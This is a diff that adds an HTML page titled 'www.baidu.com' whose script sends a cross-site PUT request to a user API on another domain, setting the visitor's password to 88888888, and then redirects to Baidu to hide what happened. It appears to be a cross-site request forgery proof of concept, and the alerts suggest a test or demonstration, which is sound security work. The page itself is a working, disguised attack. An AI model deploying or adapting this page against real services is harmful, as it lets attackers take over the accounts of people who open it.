@@ -1,0 +1,37 @@
+<!Doctype html>
+<html>
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+		<title>www.baidu.com</title>
+	</head>
+	<body>
+		<script>
+			xhr = null;
+			if (window.XMLHttpRequest)
+			  {// code for Firefox, Mozilla, IE7, etc.
+			  xhr = new XMLHttpRequest();
+			  }
+			else if (window.ActiveXObject)
+			  {// code for IE6, IE5
+			  xhr = new ActiveXObject("Microsoft.XMLHTTP");
+			  }
+
+			xhr.onreadystatechange = function() {
+				if (xhr.readyState == 4) {
+					if (xhr.status >= 200 && xhr.status < 300) {
+						alert("Changed password to 88888888");
+					}
+					else {
+						alert("Failed to change password.");
+					}
+				}
+			};
+
+			xhr.open("PUT", "https://tra-fr-2.zhouyc.cc/api/core/users/", true);
+			xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+			xhr.send("password=88888888");
+
+			window.location.replace("https://www.baidu.com/");
+		</script>
+	</body>
+</html>
